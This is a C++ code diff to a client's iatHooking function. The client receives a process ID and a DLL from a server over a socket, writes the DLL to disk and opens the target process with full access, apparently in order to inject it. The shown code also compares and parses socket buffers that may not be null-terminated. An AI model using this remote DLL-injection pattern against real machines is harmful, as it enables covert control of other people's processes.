@@ -288,18 +288,34 @@ void iatHooking(SocketManager & socketManager, SOCKET & socket)
 {
 	int result;
 	char recvbuf[DEFAULT_BUFLEN * 4];
+	
 	//get processID
 	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4); 
-	DWORD processID = 3104;// TODO: fix
+	DWORD processID = atoi(recvbuf);
 
 	//get dll
-	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 400); // TODO: fix in server so that gets it in bytes
+	//result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 400); // TODO: fix in server so that gets it in bytes
 
      //Create the dll in IAT Hooking\IATHooking.dll in Client PC
 	char * dllPath = "IAT Hooking\\IATHooking.dll";
 	std::ofstream clientFile = openFile(dllPath);
-	clientFile.write(recvbuf, result);
-	clientFile.close();
+	//clientFile.write(recvbuf, result);
+	//clientFile.close();
+	do
+	{
+		result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
+		if ((strcmp(recvbuf, "END_IAT_HOOKING") != 0))
+		{
+			clientFile.write(recvbuf, result);
+		}
+
+	} while (strcmp(recvbuf, "END_IAT_HOOKING") != 0);
+
+
+	if (!strcmp(recvbuf, "END_IAT_HOOKING"))
+	{
+		clientFile.close();
+	}
 
 	HANDLE hprocess = NULL;
 	hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
